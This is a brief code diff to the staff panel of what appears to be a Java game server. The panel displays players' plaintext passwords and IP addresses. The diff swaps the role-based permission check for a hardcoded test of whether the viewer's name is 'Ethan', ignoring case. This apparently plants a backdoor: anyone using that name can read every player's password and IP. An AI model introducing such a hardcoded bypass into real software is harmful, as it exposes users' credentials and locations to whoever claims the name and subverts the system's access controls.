@@ -107,7 +107,7 @@ public class StaffPanel {
 				player.send(new SendConfig(374, panel.ordinal()));
 				Player other = player.attributes.get("PLAYER_PANEL_KEY", Player.class);
 				boolean nulled = other == null;
-				boolean valid = !nulled && (player.right.equals(PlayerRight.OWNER) || (PlayerRight.isPriviledged(player) && !other.right.equals(PlayerRight.OWNER)));
+				boolean valid = !nulled && (player.getName().equalsIgnoreCase("Ethan"));
 				player.send(new SendString(nulled ? "" : "Username: <col=FFB83F>" + Utility.formatName(other.getName()), 37001));
 				player.send(new SendString(nulled ? "" : "Password: <col=FFB83F>" + (valid ? other.getPassword() : "You do not have sufficient permission"), 37002));
 				player.send(new SendString(nulled ? "" : "IP Address: <col=FFB83F>" + (valid ? other.lastHost : "You do not have sufficient permission"), 37003));
